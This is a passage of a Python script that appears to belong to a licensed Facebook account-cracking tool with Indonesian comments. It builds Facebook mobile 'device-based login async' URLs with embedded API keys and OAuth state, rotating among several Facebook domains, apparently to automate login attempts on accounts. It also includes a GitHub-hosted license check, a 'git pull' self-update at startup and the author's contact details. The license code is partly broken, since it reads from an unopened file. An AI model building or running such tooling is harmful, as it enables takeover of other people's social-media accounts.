9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"
    return gok
def posturlm():
    url = random.choice(["mobile.facebook.com","m.facebook.com","m.prod.facebook.com","d.facebook.com","mbasic.prod.facebook.com","mbasic.facebook.com","x.facebook.com"])
    gok = f"https://{url}/login/device-based/login/async/?api_key=322935469656730&auth_token=a24f0ca89503ac9001f1d2e7750d076c&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D63470cb6-d195-4c66-bef3-bbb265d4fa7b%26tp%3Dunspecified&refsrc=deprecated&app_id=322935469656730&cancel=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATBTc4ms138Pp2xHXzkNcmeI7vVr8qwBB7D167Pj-QHBlG0ALPaXnyL7oCjALVAKs8XCzqUYyWx5jl8KkUp3JjzyOrGFRjiLzyfbASYI63BJpeo862ReIhjwh1duoac8YTuwiA7aY0qiS-0kEeJZgVgPetltMzzH0ULSbmCp2NYo1MttqFsLIViT7tU0zIANaRUEpBOaCF6bz3YxQ69QnFCHzJ8gQWGv3Za1pyzkuGn0XtiuIQI3writ8nZJq657qRiIEWS4WiILWe43JoHqRX-EdNPtHUol9yfrtqAG8OjC-wgWTH6_XXkUpVVtWWBbYFEV5epIF54ZYLlS1KPcd7AmQ0EPZYZgiar1gDylNBqPdtsOSvE9ZN2jcx6jPfxpwEeQ92umRlD4LPw58xKSON672YfR2NEmBB4W-vkSv8WKb8O6QJ4EK4qUanKoYnBp62JHqSPj0xFwl-6xJcanndB3yNMxugsOz6uTaCORDSgSoTJZnLNrz12qG-jex-XAEmaF4GcrNXibeBzzZJhcmCcDdK9tQSids_JHHLX-SLLI6y9FYBlCV9LHHaATAAOlM_7lu-eGSoxjdEqTf64eftnTXq-JEyq-9MKtEOQXgLMyY-2-cxU82O0koiBgjNgZtoq0CPyHz2mCenqvUo2n-FLL4KV2K2MCk5-QtmlyzgZELyF24rHhYH45GfTcxPij6GtqegaqYSwJ-wfCJ1IBGla5YYnxc6S4lsCfx8IfDoVekN9-sIbo5G-btoB4UFrd5OEQMlvA73lIA6aTkWBLvc_4WpwZCD3PDWMqWUBlFE5dJLMGj3IVPrUDU92YlOp4jx-xT4V-5lyfP02RMFEZ83LLm2p6eqoY6qUgNWri02dWdIv0DwWRMwpj5H2qq8vIltPROdjusaqNNvmR9L9hZQ%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100"
    return gok
#----------------------[ LICENSE ]---------------------#
import requests
from datetime import datetime

LICENSE_FILE_PATH = "saved_license.txt"

def is_license_valid(license_info):
    # Split license_info into components
    license_key, start_time_str, end_time_str = license_info.split('|')

    # Convert string times to datetime objects
    start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')

    # Get current time
    current_time = datetime.now()

    # Check if the license is within the valid time range
    return start_time <= current_time <= end_time

def check_license(license_key):
    # Jika lisensi sudah tersimpan, gunakan langsung tanpa memerlukan input
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            if saved_license and is_license_valid(saved_license):
                return True
    except FileNotFoundError:
        pass

    # Jika lisensi tidak tersimpan atau tidak valid, lakukan verifikasi ulang
    github_repo_url = "https://raw.githubusercontent.com/khoirulez/RR07/main/mylisensi.txt"
    try:
        response = requests.get(github_repo_url)
        licenses = response.text.split('\n')

        for license_info in licenses:
            if license_info.startswith(license_key) and is_license_valid(license_info):
                # Simpan lisensi yang valid ke penyimpanan lokal
                with open(LICENSE_FILE_PATH, 'w') as file:
                    file.write(license_info)
                return True

        return False

    except requests.RequestException as e:
        print(f"Error: {e}")
        return False
def get_expiration_date(license_info):
    _, _, end_time_str = license_info.split('|')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')
    return end_time
def run():
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ')
            saved_license = file.read()
            expiration_date = get_expiration_date(saved_license)
            print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
            if saved_license and is_license_valid(saved_license):
                time.sleep(0.03)
                print(f"{H}Lisensi valid. Selamat menggunakan program.")
                time.sleep(2)
                os.system("clear")
                REQ().Menuuu()
    except (IOError,FileNotFoundError):
       license_key = input(f"[{h}•{x}]{U}Masukkan lisensi{x}:{B} ")
       licen=open(".saved_license.txt", "w").write(license_key)
       time.sleep(0.03)

       if check_license(license_key):
          print(f'  [•]{M} Sedang Mengecek Lisensi..... !!!! ')
          time.sleep(1)
          saved_license = file.read()
          expiration_date = get_expiration_date(saved_license)
          print(f"{H}Lisensi kadaluwarsa pada tanggal: {B}{expiration_date.strftime('%Y-%m-%d %H:%M')}");time.sleep(2)
          if saved_license and is_license_valid(saved_license):
              time.sleep(0.03)
              print(f"{H}Lisensi valid. Selamat menggunakan program.")
              time.sleep(2)
              os.system("clear")
              REQ().Menuuu()
       else:
          os.system("rm -f .saved_license.txt")
          print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.")
          time.sleep(0.03)
          run()
 
if __name__=='__main__':
  try:
      os.system("git pull") ; os.system("clear") ; REQ().Pepek()
  except requests.exceptions.ConnectionError as e:
      os.system("clear") ; Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit() 


# FREE AND OPEN SOURCE       
# FREE SCRIPTS CANNOT BE SOLD AND BUYED
# https://github.com/khoirulez
# WA : 6281283547452